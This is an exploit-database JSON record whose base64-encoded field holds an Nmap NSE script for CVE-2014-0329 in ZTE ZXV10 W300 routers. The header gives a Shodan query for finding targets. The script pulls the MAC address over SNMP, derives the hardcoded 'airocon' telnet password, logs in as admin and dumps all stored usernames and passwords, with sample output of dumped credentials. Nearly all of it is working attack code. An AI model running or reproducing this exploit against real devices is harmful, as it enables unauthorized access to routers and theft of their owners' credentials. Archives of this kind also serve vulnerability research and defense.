{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBaVEUgWlhWMTAgVzMwMCByb3V0ZXIgY29udGFpbnMgaGFyZGNvZGVkIGNyZWRlbnRpYWxzDQojIERhdGU6IDAzIEZlYiAyMDE0DQojIEV4cGxvaXQgQXV0aG9yOiBDZXNhciBOZWlyYQ0KIyBWZW5kb3IgSG9tZXBhZ2U6IGh0dHA6Ly93d3dlbi56dGUuY29tLmNuLw0KIyBWZXJzaW9uOiBaVEUgWlhWMTAgVzMwMCB2Mi4xDQojIENWRSA6IENWRS0yMDE0LTAzMjkNCiMgRG9yayAoU2hvZGFuKTogQmFzaWMgcmVhbG09ImluZGV4Lmh0bSINCiMgUmVmZXJlbmNlczoNCmh0dHA6Ly9hbGd1aWVuZW5sYWZpc2kuYmxvZ3Nwb3QuY29tLzIwMTQvMDIvaGFja2VhbmRvLWVsLXJvdXRlci16dGUtenh2MTAtdzMwMC12MjEuaHRtbA0KDQoNCmxvY2FsIG5tYXAgPSByZXF1aXJlICJubWFwIg0KbG9jYWwgc3RkbnNlID0gcmVxdWlyZSAic3RkbnNlIg0KbG9jYWwgc25tcCA9IHJlcXVpcmUgInNubXAiDQpsb2NhbCB2dWxucyA9IHJlcXVpcmUgInZ1bG5zIg0KDQpkZXNjcmlwdGlvbiA9IFtbDQpaVEUgWlhWMTAgVzMwMCByb3V0ZXIgY29udGFpbnMgaGFyZGNvZGVkIGNyZWRlbnRpYWxzIHRoYXQgYXJlIHVzZWFibGUgZm9yIHRoZQ0KdGVsbmV0IHNlcnZpY2Ugb24gdGhlIGRldmljZS4gVGhlIHVzZXJuYW1lIGlzICJhZG1pbiIgYW5kIHRoZSBwYXNzd29yZCBpcw0KIlhYWFhhaXJvY29uIiB3aGVyZSAiWFhYWCIgaXMgdGhlIGxhc3QgZm91ciBjaGFyYWN0ZXJzIG9mIHRoZSBkZXZpY2UncyBNQUMNCmFkZHJlc3MuIFRoZSBNQUMgYWRkcmVzcyBpcyBvYnRhaW5hYmxlIG92ZXIgU05NUCB3aXRoIGNvbW11bml0eSBzdHJpbmcgcHVibGljLg0KXV0NCmF1dGhvciA9ICJDZXNhciBOZWlyYSINCmxpY2Vuc2UgPSAiU2FtZSBhcyBObWFwLS1TZWUgaHR0cDovL25tYXAub3JnL2Jvb2svbWFuLWxlZ2FsLmh0bWwiDQpjYXRlZ29yaWVzID0geyJ2dWxuIiwgImV4cGxvaXQiLCAiaW50cnVzaXZlIn0NCg0KLS0tDQotLQ0KLS0gQHVzYWdlIG5tYXAgLXNVIC1zUyAtcCBVOjE2MSxUOjIzIC0tc2NyaXB0PWFpcm9jb24gZXhhbXBsZS5vcmcNCi0tIEBvdXRwdXQNCi0tIFBPUlQgICAgU1RBVEUgICAgICAgICBTRVJWSUNFDQotLSAyMy90Y3AgIG9wZW4gICAgICAgICAgdGVsbmV0DQotLSAxNjEvdWRwIG9wZW58ZmlsdGVyZWQgc25tcA0KLS0gDQotLSBIb3N0IHNjcmlwdCByZXN1bHRzOg0KLS0gfCBhaXJvY29uOiANCi0tIHwgICBWVUxORVJBQkxFOg0KLS0gfCAgIFpURSBaWFYxMCBXMzAwIHJvdXRlciBjb250YWlucyBoYXJkY29kZWQgY3JlZGVudGlhbHMNCi0tIHwgICAgIFN0YXRlOiBWVUxORVJBQkxFIChFeHBsb2l0YWJsZSkNCi0tIHwgICAgIElEczogIENWRTpDVkUtMjAxNC0wMzI5DQotLSB8ICAgICBSaXNrIGZhY3RvcjogSGlnaCAgQ1ZTU3YyOiA5LjMgKEhJR0gpIChBVjpOL0FDOk0vQXU6Ti9DOkMvSTpDL0E6QykNCi0tIHwgICAgIERlc2NyaXB0aW9uOg0KLS0gfCAgICAgICBaVEUgWlhWMTAgVzMwMCByb3V0ZXIgY29udGFpbnMgaGFyZGNvZGVkIGNyZWRlbnRpYWxzIHRoYXQgYXJlIHVzZWFibGUgZm9yIHRoZSB0ZWxuZXQNCi0tIHwgICAgICAgc2VydmljZSBvbiB0aGUgZGV2aWNlLiBUaGUgdXNlcm5hbWUgaXMgImFkbWluIiBhbmQgdGhlIHBhc3N3b3JkIGlzICJYWFhYYWlyb2NvbiINCi0tIHwgICAgICAgd2hlcmUgIlhYWFgiIGlzIHRoZSBsYXN0IGZvdXIgY2hhcmFjdGVycyBvZiB0aGUgZGV2aWNlJ3MgTUFDIGFkZHJlc3MuIFRoZSBNQUMgYWRkcmVzcw0KLS0gfCAgICAgICBpcyBvYnRhaW5hYmxlIG92ZXIgU05NUCB3aXRoIGNvbW11bml0eSBzdHJpbmcgcHVibGljLg0KLS0gfCAgICAgRGlzY2xvc3VyZSBkYXRlOiAyMDE0LTItMw0KLS0gfCAgICAgRXhwbG9pdCByZXN1bHRzOg0KLS0gfCAgICAgICBhZG1pbjoxMjM0DQotLSB8ICAgICAgIHN1cHBvcnQ6MTIzNA0KLS0gfCAgICAgICBhZG1pbjowRTkxYWlyb2Nvbg0KLS0gfCAgICAgUmVmZXJlbmNlczoNCi0tIHwgICAgICAgaHR0cDovL2N2ZS5taXRyZS5vcmcvY2dpLWJpbi9jdmVuYW1lLmNnaT9uYW1lPUNWRS0yMDE0LTAzMjkNCi0tIHwgICAgICAgaHR0cDovL2FsZ3VpZW5lbmxhZmlzaS5ibG9nc3BvdC5jb20vMjAxNC8wMi9oYWNrZWFuZG8tZWwtcm91dGVyLXp0ZS16eHYxMC13MzAwLXYyMS5odG1sDQotLSB8XyAgICAgIGh0dHA6Ly93d3cua2IuY2VydC5vcmcvdnVscy9pZC8yMjg4ODYNCg0KLS0gQGFyZ3MgY29tbXVuaXR5IFNOTVAgY29tbXVuaXR5IChEZWZhdWx0OiBwdWJsaWMpDQotLQ0KLS0tDQoNCg0KbG9jYWwgREVGQVVMVF9DT01NVU5JVFkgPSAicHVibGljIg0KDQoNCmhvc3RydWxlID0gZnVuY3Rpb24oaG9zdCkNCiAgICBsb2NhbCBzbm1wX3BvcnQsIHRlbG5ldF9wb3J0DQogICAgDQogICAgc25tcF9wb3J0ID0gbm1hcC5nZXRfcG9ydF9zdGF0ZShob3N0LCB7bnVtYmVyPTE2MSwgcHJvdG9jb2w9InVkcCJ9KQ0KICAgIGlmIG5vdCBzbm1wX3BvcnQgIGFuZCBub3QgKHNubXBfcG9ydC5zdGF0ZSA9PSAib3BlbiIgb3Igc25tcF9wb3J0LnN0YXRlID09ICJvcGVufGZpbHRlcmVkIikgdGhlbg0KICAgICAgICByZXR1cm4gZmFsc2UNCiAgICBlbmQNCiAgICANCiAgICB0ZWxuZXRfcG9ydCA9IG5tYXAuZ2V0X3BvcnRfc3RhdGUoaG9zdCwge251bWJlcj0yMywgcHJvdG9jb2w9InRjcCJ9KQ0KICAgIGlmIG5vdCB0ZWxuZXRfcG9ydCBhbmQgbm90IHRlbG5ldF9wb3J0LnN0YXRlID09ICJvcGVuIiB0aGVuDQogICAgICAgIHJldHVybiBmYWxzZQ0KICAgIGVuZA0KICAgIA0KICAgIHJldHVybiB0cnVlDQplbmQNCg0KDQpsb2NhbCBnZXRfbWFjID0gZnVuY3Rpb24oaG9zdCwgY29tbXVuaXR5KQ0KCWxvY2FsIHNvY2tldCwgc3RhdHVzLCByZXNwb25zZQ0KCQ0KCXNvY2tldCA9IG5tYXAubmV3X3NvY2tldCgidWRwIikNCglzb2NrZXQ6c2V0X3RpbWVvdXQoNTAwMCkNCg0KCXN0YXR1cywgcmVzcG9uc2UgPSBzb2NrZXQ6Y29ubmVjdChob3N0LCAxNjEpDQoJDQoJaWYgbm90IHN0YXR1cyB0aGVuDQoJICAgIHNvY2tldDpjbG9zZSgpDQoJICAgIHJldHVybiBzdGF0dXMsIHJlc3BvbnNlDQoJZW5kDQoJDQoJbG9jYWwgcGF5bG9hZCwgcmVxdWVzdA0KDQoJcmVxdWVzdCA9IHNubXAuYnVpbGRHZXRSZXF1ZXN0KHt9LCAiLjEuMy42LjEuMi4xLjIuMi4xLjYuMTAwMDAiKQ0KCXBheWxvYWQgPSBzbm1wLmVuY29kZShzbm1wLmJ1aWxkUGFja2V0KHJlcXVlc3QsIDAsIGNvbW11bml0eSkpDQoJDQoJc3RhdHVzLCByZXNwb25zZSA9IHNvY2tldDpzZW5kKHBheWxvYWQpDQoJDQoJaWYgbm90IHN0YXR1cyB0aGVuDQoJICAgIHNvY2tldDpjbG9zZSgpDQoJICAgIHJldHVybiBzdGF0dXMsIHJlc3BvbnNlDQoJZW5kDQoJDQogICAgc3RhdHVzLCByZXNwb25zZSA9IHNvY2tldDpyZWNlaXZlX2J5dGVzKDEpDQogICAgDQogICAgaWYgbm90IHN0YXR1cyB0aGVuDQogICAgICAgIHNvY2tldDpjbG9zZSgpDQogICAgICAgIHJldHVybiBzdGF0dXMsIHJlc3BvbnNlDQogICAgZW5kDQogICAgDQogICAgc29ja2V0OmNsb3NlKCkNCiAgICANCiAgICBsb2NhbCByZXN1bHQNCglyZXN1bHQgPSBzbm1wLmZldGNoRmlyc3QocmVzcG9uc2UpDQogICAgDQogICAgaWYgbm90IHJlc3VsdCB0aGVuDQogICAgICAgIHJldHVybiBmYWxzZSwgIlVuZXhwZWN0ZWQgcmVzcG9uc2UgdmFsdWUuIg0KICAgIGVuZA0KICAgIA0KICAgIHJldHVybiB0cnVlLCBzdGRuc2UudG9oZXgocmVzdWx0KQ0KZW5kDQoNCg0KbG9jYWwgZHVtcF9jcmVkcyA9IGZ1bmN0aW9uKGhvc3QsIHVzZXIsIHBhc3N3b3JkKQ0KICAgIGxvY2FsIHNvY2tldCwgc3RhdHVzLCByZXNwb25zZQ0KICAgIA0KICAgIHNvY2tldCA9IG5tYXAubmV3X3NvY2tldCgidGNwIikNCiAgICBzb2NrZXQ6c2V0X3RpbWVvdXQoNTAwMCkNCiAgICANCiAgICBzdGF0dXMsIHJlc3BvbnNlID0gc29ja2V0OmNvbm5lY3QoaG9zdCwgMjMpDQogICAgDQogICAgaWYgbm90IHN0YXR1cyB0aGVuDQogICAgICAgIHNvY2tldDpjbG9zZSgpDQoJICAgIHJldHVybiBzdGF0dXMsIHJlc3BvbnNlDQoJZW5kDQoJDQoJbG9jYWwgcGF5bG9hZA0KCXBheWxvYWQgPSB1c2VyIC4uICJcciIgLi4gcGFzc3dvcmQgLi4gIlxyc2hccmxvZ2luIHNob3dccmV4aXRcciINCgkNCglzdGF0dXMsIHJlc3BvbnNlID0gc29ja2V0OnNlbmQocGF5bG9hZCkNCgkNCglpZiBub3Qgc3RhdHVzIHRoZW4NCgkgICAgc29ja2V0OmNsb3NlKCkNCgkgICAgcmV0dXJuIHN0YXR1cywgcmVzcG9uc2UNCgllbmQNCgkNCglzdGF0dXMsIHJlc3BvbnNlID0gc29ja2V0OnJlY2VpdmVfYnVmKCJleGl0IiwgZmFsc2UpDQoJDQoJaWYgbm90IHN0YXR1cyB0aGVuDQoJICAgIHNvY2tldDpjbG9zZSgpDQoJICAgIHJldHVybiBzdGF0dXMsIHJlc3BvbnNlDQoJZW5kDQoJDQoJc29ja2V0OmNsb3NlKCkNCgkNCglyZXR1cm4gdHJ1ZSwgcmVzcG9uc2UNCmVuZA0KDQoNCmxvY2FsIHBhcnNlX3Jlc3BvbnNlID0gZnVuY3Rpb24ocmVzcG9uc2UpDQogICAgbG9jYWwgaW5kZXgNCiAgICANCglpbmRleCA9IHN0cmluZy5maW5kKHJlc3BvbnNlLCAiVXNlcm5hbWUgK1Bhc3N3b3JkICtQcmlvcml0eSIpDQoJDQoJaWYgbm90IGluZGV4IHRoZW4NCgkgICAgcmV0dXJuIGZhbHNlLCAiVW5leHBlY3RlZCByZXNwb25zZSB2YWx1ZS4iDQoJZW5kDQoNCglpbmRleCA9IHN0cmluZy5maW5kKHJlc3BvbnNlLCAiXHJcbiIsIGluZGV4KSArIDINCglyZXNwb25zZSA9IHN0cmluZy5zdWIocmVzcG9uc2UsIGluZGV4KQ0KDQogICAgbG9jYWwgcmVzdWx0LCBlbmRsLCBsaW5lDQogICAgcmVzdWx0ID0ge30NCgkNCglpbmRleCA9IDANCgllbmRsID0gc3RyaW5nLmZpbmQocmVzcG9uc2UsICJcclxuIiwgaW5kZXgpDQoNCgl3aGlsZSBlbmRsIGRvDQoJICAgIGxpbmUgPSBzdHJpbmcuc3ViKHJlc3BvbnNlLCBpbmRleCwgZW5kbCkNCgkgICAgbGluZSA9IHN0cmluZy5nc3ViKGxpbmUsICJcciIsICIiKQ0KICAgICAgICBsaW5lID0gc3RyaW5nLmdzdWIobGluZSwgIl4gKyIsICIiKQ0KICAgICAgICBsaW5lID0gc3RyaW5nLmdzdWIobGluZSwgIiArJCIsICIiKQ0KICAgICAgICBsaW5lID0gc3RyaW5nLmdzdWIobGluZSwgIiArIiwgIiAiKQ0KICAgICAgICANCiAgICAgICAgbG9jYWwgdXNlciwgcGFzcywgcHJpbw0KICAgICAgICBmb3IgdXNlciwgcGFzcywgcHJpbyBpbiBzdHJpbmcuZ21hdGNoKGxpbmUsICIoW14gXSspIChbXiBdKykgKFteIF0rKSIpIGRvDQogICAgICAgICAgICBsb2NhbCBhdXggPSB7fQ0KICAgICAgICAgICAgYXV4Wyd1c2VybmFtZSddID0gdXNlcg0KICAgICAgICAgICAgYXV4WydwYXNzd29yZCddID0gcGFzcw0KICAgICAgICAgICAgYXV4Wydwcmlvcml0eSddID0gcHJpbw0KICAgICAgICAgICAgdGFibGUuaW5zZXJ0KHJlc3VsdCwgYXV4KQ0KICAgICAgICBlbmQNCgkgICAgDQoJICAgIGluZGV4ID0gZW5kbCArIDINCgkgICAgZW5kbCA9IHN0cmluZy5maW5kKHJlc3BvbnNlLCAiXHJcbiIsIGluZGV4KQ0KCWVuZA0KCQ0KICAgIHJldHVybiB0cnVlLCByZXN1bHQNCmVuZA0KDQoNCmFjdGlvbiA9IGZ1bmN0aW9uKGhvc3QpDQogICAgbG9jYWwgdnVsbiA9IHsNCiAgICAgICAgdGl0bGUgPSAiWlRFIFpYVjEwIFczMDAgcm91dGVyIGNvbnRhaW5zIGhhcmRjb2RlZCBjcmVkZW50aWFscyIsDQogICAgICAgIHN0YXRlID0gdnVsbnMuU1RBVEUuTk9UX1ZVTE4sDQogICAgICAgIElEUyA9IHtDVkUgPSAnQ1ZFLTIwMTQtMDMyOSd9LA0KICAgICAgICByaXNrX2ZhY3RvciA9ICJIaWdoIiwNCiAgICAgICAgc2NvcmVzID0gew0KICAgICAgICAgICAgQ1ZTU3YyID0gIjkuMyAoSElHSCkgKEFWOk4vQUM6TS9BdTpOL0M6Qy9JOkMvQTpDKSIsDQogICAgICAgIH0sDQogICAgICAgIGRlc2NyaXB0aW9uID0gW1sNClpURSBaWFYxMCBXMzAwIHJvdXRlciBjb250YWlucyBoYXJkY29kZWQgY3JlZGVudGlhbHMgdGhhdCBhcmUgdXNlYWJsZSBmb3IgdGhlIHRlbG5ldA0Kc2VydmljZSBvbiB0aGUgZGV2aWNlLiBUaGUgdXNlcm5hbWUgaXMgImFkbWluIiBhbmQgdGhlIHBhc3N3b3JkIGlzICJYWFhYYWlyb2NvbiINCndoZXJlICJYWFhYIiBpcyB0aGUgbGFzdCBmb3VyIGNoYXJhY3RlcnMgb2YgdGhlIGRldmljZSdzIE1BQyBhZGRyZXNzLiBUaGUgTUFDIGFkZHJlc3MNCmlzIG9idGFpbmFibGUgb3ZlciBTTk1QIHdpdGggY29tbXVuaXR5IHN0cmluZyBwdWJsaWMuXV0sDQogICAgICAgIHJlZmVyZW5jZXMgPSB7DQogICAgICAgICAgICAiaHR0cDovL3d3dy5rYi5jZXJ0Lm9yZy92dWxzL2lkLzIyODg4NiIsDQogICAgICAgICAgICAiaHR0cDovL2FsZ3VpZW5lbmxhZmlzaS5ibG9nc3BvdC5jb20vMjAxNC8wMi9oYWNrZWFuZG8tZWwtcm91dGVyLXp0ZS16eHYxMC13MzAwLXYyMS5odG1sIg0KICAgICAgICB9LA0KICAgICAgICBkYXRlcyA9IHsNCiAgICAgICAgICAgIGRpc2Nsb3N1cmUgPSB7eWVhciA9IDIwMTQsIG1vbnRoID0gMiwgZGF5ID0gM30sDQogICAgICAgIH0sDQogICAgICAgIGV4cGxvaXRfcmVzdWx0cyA9IHt9LA0KICAgIH0NCg0KICAgIGxvY2FsIGNvbW11bml0eQ0KICAgIGNvbW11bml0eSA9IHN0ZG5zZS5nZXRfc2NyaXB0X2FyZ3MoU0NSSVBUX05BTUUgLi4gIi5jb21tdW5pdHkiKSBvciBERUZBVUxUX0NPTU1VTklUWQ0KICAgIA0KICAgIGxvY2FsIHN0YXR1cywgcmVzcG9uc2UNCiAgICANCiAgICBzdGF0dXMsIHJlc3BvbnNlID0gZ2V0X21hYyhob3N0LCBjb21tdW5pdHkpICAgIA0KICAgIGlmIG5vdCBzdGF0dXMgdGhlbg0KICAgICAgICByZXR1cm4gcmVzcG9uc2UNCiAgICBlbmQNCiAgICANCiAgICBsb2NhbCBwYXNzd29yZA0KICAgIHBhc3N3b3JkID0gc3RyaW5nLnVwcGVyKHN0cmluZy5zdWIocmVzcG9uc2UsIDkpKSAuLiAiYWlyb2NvbiINCiAgICANCiAgICBzdGF0dXMsIHJlc3BvbnNlID0gZHVtcF9jcmVkcyhob3N0LCAiYWRtaW4iLCBwYXNzd29yZCkNCiAgICBpZiBub3Qgc3RhdHVzIHRoZW4NCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlDQogICAgZW5kDQogICAgDQogICAgc3RhdHVzLCByZXNwb25zZSA9IHBhcnNlX3Jlc3BvbnNlKCByZXNwb25zZSApDQogICAgaWYgbm90IHN0YXR1cyB0aGVuDQogICAgICAgIHJldHVybiByZXNwb25zZQ0KICAgIGVuZA0KICAgIA0KICAgIHZ1bG4uc3RhdGUgPSB2dWxucy5TVEFURS5FWFBMT0lUDQogICAgZm9yIF8sIGRhdGEgaW4gcGFpcnMocmVzcG9uc2UpIGRvDQogICAgICAgIHRhYmxlLmluc2VydCh2dWxuLmV4cGxvaXRfcmVzdWx0cywgZGF0YS51c2VybmFtZSAuLiAiOiIgLi4gZGF0YS5wYXNzd29yZCkNCiAgICBlbmQNCiAgICANCiAgICByZXR1cm4gdnVsbnMuUmVwb3J0Om5ldyhTQ1JJUFRfTkFNRSwgaG9zdCk6bWFrZV9vdXRwdXQodnVsbikNCmVuZA==", 
    "filename": "platforms/hardware/webapps/31527.nse", 
    "id": "31527", 
    "cves": [
        "CVE-2014-0329"
    ]
}